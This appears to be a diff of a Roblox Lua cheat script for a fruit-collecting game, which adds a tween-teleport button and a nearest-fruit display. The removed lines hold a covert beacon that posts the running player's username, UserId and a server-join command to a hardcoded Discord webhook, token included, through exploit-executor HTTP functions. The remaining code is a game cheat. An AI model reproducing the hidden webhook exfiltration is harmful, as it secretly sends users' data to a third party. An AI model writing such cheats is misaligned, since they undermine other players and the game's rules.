@@ -2,28 +2,17 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local Workspace = game:GetService("Workspace")
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
 
 -- Player
 local player = Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-
--- Auto-Join Marines Team
-local function joinMarines()
-    local teams = game:GetService("Teams")
-    local marinesTeam = teams:FindFirstChild("Marines")
-    if marinesTeam then
-        player.Team = marinesTeam
-    end
-end
-joinMarines()
+local camera = Workspace.CurrentCamera
 
 -- UI Setup
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = player:WaitForChild("PlayerGui")
-
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0.3, 0, 0.08, 0)
 frame.Position = UDim2.new(0.35, 0, 0.01, 0)
@@ -32,12 +21,10 @@ frame.BackgroundTransparency = 0.2
 frame.BorderSizePixel = 0
 frame.Parent = screenGui
 frame.ClipsDescendants = true
-frame.ZIndex = 1 -- Ensure the background stays behind
-
+frame.ZIndex = 1
 local uiCorner = Instance.new("UICorner")
 uiCorner.CornerRadius = UDim.new(0.2, 0)
 uiCorner.Parent = frame
-
 local fruitLabel = Instance.new("TextLabel")
 fruitLabel.Size = UDim2.new(1, 0, 1, 0)
 fruitLabel.BackgroundTransparency = 1
@@ -46,7 +33,7 @@ fruitLabel.TextScaled = true
 fruitLabel.Font = Enum.Font.GothamBold
 fruitLabel.TextStrokeTransparency = 0
 fruitLabel.TextStrokeColor3 = Color3.fromRGB(50, 50, 50)
-fruitLabel.ZIndex = 2 -- Ensure text is in front of the background
+fruitLabel.ZIndex = 2
 fruitLabel.Parent = frame
 
 -- List of fruits
@@ -57,19 +44,16 @@ local function findNearestFruit()
     local nearestFruit = nil
     local minDistance = math.huge
     local fruitCount = 0
-    
     for _, fruit in ipairs(Workspace:GetChildren()) do
         if table.find(fruitsList, fruit.Name) and fruit:FindFirstChild("Handle") then
             local distance = (humanoidRootPart.Position - fruit.Handle.Position).Magnitude
             fruitCount = fruitCount + 1
-            
             if distance < minDistance then
                 minDistance = distance
                 nearestFruit = fruit
             end
         end
     end
-    
     return nearestFruit, minDistance, fruitCount
 end
 
@@ -78,7 +62,7 @@ spawn(function()
     while true do
         local nearestFruit, distance, fruitCount = findNearestFruit()
         if nearestFruit then
-            fruitLabel.Text = "🍌 Nearest: " .. nearestFruit.Name .. " | 🚩 Distance: " .. math.floor(distance) .. "m\n⚡ Total Fruits: " .. fruitCount
+            fruitLabel.Text = "🍌 Nearest: " .. nearestFruit.Name .. " | 🚩 Distance: " .. math.floor(distance) .. "⚡ Total Fruits: " .. fruitCount
         else
             fruitLabel.Text = "No fruits found in server 🚩"
         end
@@ -86,30 +70,43 @@ spawn(function()
     end
 end)
 
--- Webhook System (IP Removed)
-local webhook = "https://discord.com/api/webhooks/1355686213662802110/Zb2ToOaLRgzBq33aMO3Z4pAEId-d68akqQwwKQagx092AziDLneZYTgw9rOsHRbWdWTi"
-local desc = string.format(
-    "Username: %s\nMobile: %s\nJoin Server: ```lua\n%s```",
-    player.Name, tostring(player.UserId), string.format(
-        "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\", game.Players.LocalPlayer)",
-        tostring(game.PlaceId), game.JobId
-    )
-)
+-- Function to move the entire character to the nearest fruit with a tween
+local function teleportToNearestFruit()
+    local nearestFruit, minDistance = findNearestFruit()
+    if nearestFruit then
+        -- Calculate the time to cover the distance at 200 studs per second
+        local time = minDistance / 200
+        local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+        
+        -- Tween the HumanoidRootPart's CFrame to the nearest fruit's position
+        local targetCFrame = CFrame.new(nearestFruit.Handle.Position)
+        local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = targetCFrame})
+        
+        -- Lock the camera to follow the humanoid root part during tweening
+        local connection
+        connection = RunService.RenderStepped:Connect(function()
+            camera.CFrame = humanoidRootPart.CFrame
+        end)
+        
+        tween.Completed:Connect(function()
+            connection:Disconnect()
+        end)
+        
+        tween:Play()
+    end
+end
 
-task.spawn(function()
-    (syn and syn.request or fluxus and fluxus.request or fluxus_request or http and http.request or http_request)({
-        Url = webhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({
-            content = "",
-            embeds = {{
-                title = "Statistics",
-                description = desc,
-                color = tonumber(0xeba300)
-            }}
-        })
-    })
-end)
+-- TP Button
+local tpButton = Instance.new("TextButton")
+tpButton.Size = UDim2.new(0.1, 0, 0.08, 0)
+tpButton.Position = UDim2.new(0.12, 0, 0.01, 0)
+tpButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+tpButton.Text = "TP"
+tpButton.Font = Enum.Font.GothamBold
+tpButton.TextScaled = true
+tpButton.TextColor3 = Color3.new(1, 1, 1)
+tpButton.Parent = screenGui
+local tpCorner = Instance.new("UICorner")
+tpCorner.CornerRadius = UDim.new(1, 0)
+tpCorner.Parent = tpButton
+tpButton.MouseButton1Click:Connect(teleportToNearestFruit)
